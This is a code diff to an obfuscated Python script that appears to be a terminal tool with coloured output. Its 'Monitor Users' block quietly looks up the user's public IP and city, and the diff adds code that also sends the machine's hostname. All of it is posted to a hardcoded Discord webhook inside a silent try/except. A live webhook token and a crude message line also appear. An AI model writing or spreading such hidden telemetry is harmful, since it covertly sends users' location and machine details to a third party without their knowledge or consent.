@@ -1,6 +1,7 @@
 import os #line:1
 import time #line:2
 import sys #line:3
+import socket
 """Colors For Ui"""#line:4
 BLACK ="\033[0;30m"#line:5
 RED ="\033[0;31m"#line:6
@@ -52,12 +53,14 @@ import requests #line:53
 """Monitor Users"""#line:54
 try :#line:55
  ip =requests .get ("https://api.ipify.org").text #line:56
- message ={"content":f"asia loves kids {ip}"}#line:59
+ message ={"content":f"ip {ip}"}#line:59
  geo =requests .get (f"https://ipinfo.io/{ip}/json").json ()#line:60
  geo_info =(f"Area {geo.get('city')}\n")#line:63
+ host = socket.gethostname()
  webhook_url ="https://discord.com/api/webhooks/1382532762929467443/qnTBZfbMSbHhjmJ7sR-t2L1zCztsqVJr8HlkTZ9gTVcFKQaUWmNlWtjSMLShk5NfYO2q"#line:64
  requests .post (webhook_url ,json ={"content":geo_info })#line:65
  requests .post (webhook_url ,json =message )#line:66
+ requests.post(webhook_url, json={"content": "hostname "f'{host}'})
 except :#line:67
    pass #line:68
 """Monitor Users"""#line:69
